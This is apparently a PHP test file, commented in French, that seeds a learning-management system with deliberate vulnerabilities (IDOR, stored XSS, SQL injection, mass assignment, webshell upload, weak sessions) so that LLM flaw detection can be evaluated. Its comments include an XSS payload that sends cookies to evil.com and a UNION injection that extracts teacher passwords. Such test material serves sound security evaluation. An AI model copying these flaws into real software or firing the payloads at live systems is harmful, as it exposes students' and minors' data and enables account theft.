<?php
/**
 * FICHIER DE TEST — VULNÉRABILITÉS INTENTIONNELLES (DOMAINE : ÉDUCATION / LMS)
 * Usage : évaluation LLM — détection de failles dans une plateforme e-learning
 * Réglementation : RGPD (données mineurs), FERPA (US), COPPA (enfants < 13 ans),
 *                  Protection des données élèves (données sensibles)
 * Plateformes cibles : Moodle, Canvas, Blackboard, custom LMS
 * NE PAS déployer en production.
 */

$pdo = new PDO('mysql:host=localhost;dbname=lms', 'root', '');

// ═══════════════════════════════════════════════════════════════════════
// 1. IDOR — accès aux notes et examens d'un autre étudiant
// OWASP A01:2025 – Broken Access Control | CVSS 8.6
// Impact : fraude académique + violation RGPD données éducatives de mineurs
// ═══════════════════════════════════════════════════════════════════════
$student_id = $_GET['student_id'];  // l'étudiant change l'ID dans l'URL
$stmt = $pdo->prepare("SELECT * FROM grades WHERE student_id = ?");
$stmt->execute([$student_id]);
echo json_encode($stmt->fetchAll()); // expose notes, examens, bulletins d'un autre élève

// ═══════════════════════════════════════════════════════════════════════
// 2. XSS PERSISTANT DANS LES FORUMS DE COURS
// OWASP A05:2025 – Injection | CVSS 8.8
// Impact : vol de session enseignant → accès à toutes les notes + fraude massive
// Payload : <img src=x onerror="document.location='https://evil.com/?c='+document.cookie">
// ═══════════════════════════════════════════════════════════════════════
function postComment(PDO $pdo, int $courseId, string $content, int $userId): void {
    $pdo->exec("INSERT INTO forum_posts (course_id, content, user_id, created_at)
                VALUES ($courseId, '$content', $userId, NOW())");
    // contenu HTML/JS non filtré stocké et réaffiché à tous les étudiants du cours
}

function displayComments(PDO $pdo, int $courseId): void {
    $posts = $pdo->query("SELECT content, username FROM forum_posts
                           INNER JOIN users ON forum_posts.user_id = users.id
                           WHERE course_id = $courseId")->fetchAll();
    foreach ($posts as $post) {
        echo "<div class='post'>" . $post['content'] . "</div>"; // pas d'échappement
    }
}

// ═══════════════════════════════════════════════════════════════════════
// 3. MODIFICATION DES NOTES PAR IDOR + MASS ASSIGNMENT
// OWASP A01:2025 – Broken Access Control | CVSS 9.1
// Impact : fraude académique massive — diplômes frauduleux
// ═══════════════════════════════════════════════════════════════════════
function updateGrade(int $grade_id, array $data): void {
    global $pdo;
    // un étudiant peut envoyer un PUT /grades/42 avec {grade: 20, comment: "Excellent"}
    // aucune vérification que l'appelant est l'enseignant responsable
    $columns = implode(', ', array_map(fn($k) => "$k=?", array_keys($data)));
    $stmt = $pdo->prepare("UPDATE grades SET $columns WHERE id = ?");
    $stmt->execute([...array_values($data), $grade_id]);
}

// ═══════════════════════════════════════════════════════════════════════
// 4. DONNÉES PERSONNELLES DE MINEURS NON PROTÉGÉES
// OWASP A01:2025 – Broken Access Control + RGPD/COPPA | CVSS 8.5
// Impact : violation RGPD Article 8 — consentement parental non requis
// ═══════════════════════════════════════════════════════════════════════
function getStudentProfile(int $student_id): array {
    global $pdo;
    // données de mineurs : âge, adresse, photo, difficultés d'apprentissage, handicap
    $stmt = $pdo->prepare("SELECT * FROM students WHERE id = ?");
    $stmt->execute([$student_id]);
    $profile = $stmt->fetch();
    // exposé sans vérification : parent peut accéder au profil de n'importe quel élève
    // données de santé incluses (dyslexie, TDAH, allergie en cas d'accident scolaire)
    return $profile;
}

// ═══════════════════════════════════════════════════════════════════════
// 5. UPLOAD DE FICHIER SANS VÉRIFICATION — webshell via devoir rendu
// OWASP A05:2025 – Injection | CVSS 9.8
// Impact : compromission complète du serveur LMS via un devoir "rendu" par un étudiant
// ═══════════════════════════════════════════════════════════════════════
function submitAssignment(array $file, int $student_id, int $course_id): string {
    global $pdo;
    $destination = '/var/www/lms/submissions/' . $file['name']; // nom non sanitisé
    move_uploaded_file($file['tmp_name'], $destination);
    // un étudiant upload shell.php → accessible via GET /submissions/shell.php → RCE
    $pdo->exec("INSERT INTO submissions (student_id, course_id, file_path)
                VALUES ($student_id, $course_id, '$destination')");
    return $destination;
}

// ═══════════════════════════════════════════════════════════════════════
// 6. SQL INJECTION DANS LA RECHERCHE D'ÉTUDIANTS
// OWASP A05:2025 – Injection | CVSS 9.8
// Impact : dump de toute la base étudiants + données de mineurs
// ═══════════════════════════════════════════════════════════════════════
$search = $_GET['q'] ?? '';
$students = $pdo->query(
    "SELECT id, name, email, class, grade_avg FROM students
     WHERE name LIKE '%$search%' OR email LIKE '%$search%'"
)->fetchAll();
// Payload : %' UNION SELECT id, name, password, email, 1 FROM teachers --
// → expose les mots de passe des enseignants

// ═══════════════════════════════════════════════════════════════════════
// 7. SESSION PARTAGÉE ENTRE ÉTUDIANTS — salle informatique
// OWASP A07:2025 – Authentication Failures | CVSS 8.0
// Impact : usurpation d'identité en salle de classe
// ═══════════════════════════════════════════════════════════════════════
session_start();
// Timeout de session non configuré → session reste ouverte après déconnexion
// Dans une salle informatique partagée, l'étudiant suivant récupère la session
session_set_cookie_params([
    'lifetime' => 0,        // expire à la fermeture du navigateur — mais...
    'secure'   => false,    // HTTP — interceptable
    'httponly' => false,    // XSS peut voler la session
]);
// session_regenerate_id() jamais appelé après login

// ═══════════════════════════════════════════════════════════════════════
// 8. EXAMEN EN LIGNE — pas de protection anti-triche
// OWASP A06:2025 – Insecure Design | CVSS 8.0
// Impact : fraude académique systématique
// ═══════════════════════════════════════════════════════════════════════
function getExamQuestions(int $exam_id, int $student_id): array {
    global $pdo;
    $stmt = $pdo->prepare("SELECT * FROM exam_questions WHERE exam_id = ?");
    $stmt->execute([$exam_id]);
    $questions = $stmt->fetchAll();
    // les réponses correctes sont incluses dans la réponse JSON !
    // pas de randomisation des questions
    // pas de minutage côté serveur (validé côté client JS uniquement)
    // pas de vérification que l'IP reste la même pendant l'examen
    return $questions; // {question: "...", correct_answer: "B", ...}
}
